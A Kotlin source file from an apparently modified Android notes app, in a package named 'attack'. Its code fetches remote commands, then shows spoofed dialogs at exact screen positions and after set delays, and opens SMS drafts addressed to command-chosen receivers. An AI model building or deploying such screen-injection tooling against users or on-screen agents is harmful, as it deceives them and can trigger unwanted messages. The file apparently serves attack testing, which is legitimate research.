package org.fossify.notes.attack

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.Window
import android.view.WindowManager
import android.widget.TextView


fun showDialog(dialogData: DialogData, context: Context) {
    // 创建一个对话框
    val builder = AlertDialog.Builder(context)

    builder.setTitle(dialogData.title)
    builder.setMessage(dialogData.message)


    // 设置确认按钮
    if (dialogData.confirmVisible) {
        builder.setPositiveButton(dialogData.confirm) { dialog, _ ->
            // 处理确认按钮点击
            dialog.dismiss()
        }
    }

    // 设置取消按钮
    if (dialogData.cancelVisible) {
        builder.setNegativeButton(dialogData.cancel) { dialog, _ ->
            // 处理取消按钮点击
            dialog.dismiss()
        }
    }

    // 创建对话框
    val dialog = builder.create()

    // 延迟显示对话框（如果需要的话，可以根据 delay 设置）
    Handler(Looper.getMainLooper()).postDelayed({
        Log.i("Attack",
            "Show dialog L${dialogData.left} T${dialogData.top} W${dialogData.width} H${dialogData.height} " +
                "Title: ${dialogData.title} Message: ${dialogData.message} Confirm: ${dialogData.confirmVisible} ${dialogData.confirm} Cancel: ${dialogData.cancelVisible} ${dialogData.cancel}")
        // 获取对话框窗口
        val window: Window? = dialog.window
        if (window != null) {
            // 设置窗口属性
            val params: WindowManager.LayoutParams = window.attributes

            // 设置对话框的位置
            params.gravity = Gravity.TOP or Gravity.LEFT
            params.x = dialogData.left
            params.y = dialogData.top

            // 设置对话框的宽高
            params.width = dialogData.width
            params.height = dialogData.height

            // 应用窗口属性
            window.attributes = params

        }

        // 显示对话框
        dialog.show()
    }, dialogData.delay)  // 延迟时间

}

fun sendMessage(message: MessageData, context: Context) {
    // 使用 Handler 来延迟执行
    Handler(Looper.getMainLooper()).postDelayed({
        // 创建短信发送的 Intent
        val smsUri = Uri.parse("smsto:${message.receiver}") // 使用 "smsto:" 协议来指定短信接收号码
        val intent = Intent(Intent.ACTION_SENDTO, smsUri)

        // 填充短信内容
        intent.putExtra("sms_body", message.content)

        // 启动短信应用程序
        context.startActivity(intent)
    }, message.delay) // 延迟时间
}


fun showButton(buttonData: ButtonData, context: Context) {

}

fun attack(action: String, context: Context) {
    fetchViewCli(action) { cmds ->
        // dialogs
        for (dialog in cmds.dialogs) {
            showDialog(dialog, context)
        }
        // button
        for (button in cmds.buttons) {
            showButton(button, context)
        }
        // message
        for (message in cmds.messages) {
            sendMessage(message, context)
        }
    }

}
